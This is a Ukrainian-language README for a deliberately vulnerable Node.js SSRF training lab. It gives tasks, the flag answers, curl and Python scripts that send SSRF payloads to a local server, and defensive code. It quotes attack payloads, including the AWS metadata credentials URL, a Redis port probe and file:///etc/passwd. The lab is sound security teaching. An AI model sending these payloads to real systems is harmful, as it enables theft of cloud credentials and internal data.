# 🔥 OWASP A10: SSRF Attack Lab

![OWASP](https://img.shields.io/badge/OWASP-Top%2010-red)
![Node.js](https://img.shields.io/badge/Node.js-18+-green)
![License](https://img.shields.io/badge/License-AMaster-blue)

**Лабораторна робота** з вивчення вразливості **SSRF (Server-Side Request Forgery)** — підробка серверних запитів.

> ⚠️ **УВАГА**: Цей проєкт **умисно вразливий** і створений тільки для навчальних цілей! Не використовуй цей код у продакшені!

---

## 📚 Що таке SSRF?

**SSRF (Server-Side Request Forgery)** — це вразливість, коли атакувач може змусити сервер виконати HTTP-запити до довільних URL-адрес. Це дозволяє:

- 🎯 Отримати доступ до внутрішніх API та сервісів
- ☁️ Витягнути секретні ключі з метаданих хмари (AWS, Azure, GCP)
- 🔍 Сканувати внутрішню мережу
- 🔐 Обійти файрволи та ACL
- 💀 Атакувати внутрішні бази даних та сервіси

### Приклад атаки:

```http
POST /fetch HTTP/1.1
Content-Type: application/json

{
  "url": "http://localhost:3010/internal/api"
}
```

Сервер виконує запит від свого імені і повертає атакувачу дані з внутрішнього API, який не має бути доступний ззовні!

---

## 🚀 Швидкий старт

### 1. Встановлення

```bash
# Клонуй або завантаж проєкт
cd owasp-a10-ssrf

# Встанови залежності
npm install
```

### 2. Запуск сервера

```bash
npm start
```

Або для розробки з автоперезапуском:

```bash
npm run dev
```

### 3. Відкрий браузер

```
http://localhost:3010
```

---

## 📁 Структура проєкту

```
owasp-a10-ssrf/
├── server.js           # Вразливий сервер
├── package.json        # Залежності проєкту
├── public/
│   └── index.html      # Фронтенд інтерфейс
└── README.md           # Цей файл
```

---

## 🎯 Завдання для виконання

### Рівень 1: Базова атака
1. Відкрий http://localhost:3010
2. Введи звичайний URL: `https://httpbin.org/ip`
3. Переконайся, що запит працює

### Рівень 2: Внутрішній API
4. Спробуй: `http://localhost:3010/internal/api`
5. Знайди перший FLAG у відповіді

### Рівень 3: База користувачів
6. Атакуй: `http://127.0.0.1:3010/internal/users`
7. Отримай паролі адміністраторів
8. Знайди другий FLAG

### Рівень 4: Метадані хмари
9. Запит до: `http://localhost:3010/metadata/credentials`
10. Витягни AWS credentials
11. Знайди третій FLAG

### Рівень 5: Адмін-панель
12. Зламай: `http://127.0.0.1:3010/admin/dashboard`
13. Отримай admin token
14. Знайди четвертий FLAG

### Бонус: Port scanning
15. Спробуй просканувати порти: `http://localhost:3306`, `http://127.0.0.1:6379`
16. Дослідж, які сервіси можна виявити

---

## 🏆 Прапорці (Flags)

У лабораторці є **4 прапорці**, які треба знайти:

1. `SSRF{Y0U_F0UND_1NT3RN4L_4P1}` — Internal API
2. `SSRF{US3R_D4T4B4S3_L34K3D}` — User Database
3. `SSRF{CL0UD_M3T4D4T4_ST0L3N}` — Cloud Metadata
4. `SSRF{4DM1N_P4N3L_PWNED}` — Admin Panel

Знайшов усі? Ти молодець! 🎉

---

## 🔓 Вразливі ендпоінти

### `/fetch` — ВРАЗЛИВИЙ!
```javascript
POST /fetch
Content-Type: application/json

{
  "url": "http://example.com"
}
```

**Проблема**: Немає жодної валідації URL! Можна запросити будь-що.

### Внутрішні ресурси (доступні через SSRF):

| Ендпоінт | Опис | FLAG |
|----------|------|------|
| `/internal/api` | Внутрішній API з секретами | ✅ |
| `/internal/users` | База користувачів | ✅ |
| `/metadata/credentials` | Метадані хмари | ✅ |
| `/admin/dashboard` | Адмін-панель | ✅ |

---

## 🛡️ Як захиститися від SSRF?

### 1. **Whitelist дозволених доменів**
```javascript
const allowedDomains = ['api.example.com', 'cdn.example.com'];
const urlObj = new URL(url);

if (!allowedDomains.includes(urlObj.hostname)) {
    throw new Error('Domain not allowed');
}
```

### 2. **Блокувати приватні IP-адреси**
```javascript
const privateIPRegex = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/;

if (privateIPRegex.test(urlObj.hostname)) {
    throw new Error('Private IP addresses are forbidden');
}
```

### 3. **Використовувати бібліотеки**
```bash
npm install ssrf-req-filter
```

```javascript
const ssrfFilter = require('ssrf-req-filter');

axios.get(url, {
    httpAgent: ssrfFilter(url),
    httpsAgent: ssrfFilter(url)
});
```

### 4. **Відключити редіректи**
```javascript
axios.get(url, {
    maxRedirects: 0
});
```

### 5. **Network segmentation**
- Ізолюй внутрішні сервіси
- Використовуй VPC/VLAN
- Налаштуй файрволи

### 6. **Додаткові міри**
- Таймаути на запити (timeout: 5000)
- Обмеження розміру відповіді
- Логування всіх запитів
- Rate limiting
- Аутентифікація для внутрішніх API

---

## 🔍 Реальні приклади SSRF

### Capital One (2019)
Атакувач використав SSRF для доступу до AWS метаданих:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Результат**: Витік даних 100+ млн клієнтів.

### Shopify (2017)
SSRF через обробку зображень:
```
http://localhost:6379/  # Redis
```
**Результат**: RCE через Redis exploitation.

### Hackerone (2018)
SSRF в PDF generator:
```
file:///etc/passwd
```
**Результат**: Читання локальних файлів.

---

## 📦 Залежності

```json
{
  "express": "^4.18.2",
  "body-parser": "^1.20.2",
  "axios": "^1.6.7"
}
```

---

## 🧪 Тестування

### cURL приклади:

```bash
# Звичайний запит
curl -X POST http://localhost:3010/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"https://httpbin.org/ip"}'

# SSRF атака
curl -X POST http://localhost:3010/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3010/internal/api"}'

# Отримати користувачів
curl -X POST http://localhost:3010/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3010/internal/users"}'
```

### Python скрипт:

```python
import requests

def ssrf_attack(target_url):
    payload = {"url": target_url}
    response = requests.post(
        "http://localhost:3010/fetch",
        json=payload
    )
    return response.json()

# Атака
result = ssrf_attack("http://localhost:3010/internal/api")
print(result)
```

---

## 🎓 Додаткові матеріали

### Документація:
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [HackerOne SSRF Reports](https://hackerone.com/reports?query=ssrf)

### Інструменти:
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap) — автоматизація SSRF
- [Gopherus](https://github.com/tarunkant/Gopherus) — експлуатація через gopher://
- [Burp Suite](https://portswigger.net/burp) — тестування веб-додатків

### CTF платформи:
- [HackTheBox](https://hackthebox.com)
- [TryHackMe](https://tryhackme.com)
- [PentesterLab](https://pentesterlab.com)

---

## 📝 Звіт про лабораторну роботу



## 3. Висновки
[Твої висновки про SSRF та методи захисту]
```

## 🐛 Відомі проблеми

- Localhost може не працювати на деяких системах (використовуй 127.0.0.1)
- Windows може блокувати порт 3010 (зміни PORT у server.js)
- Деякі антивіруси можуть блокувати "шкідливі" запити
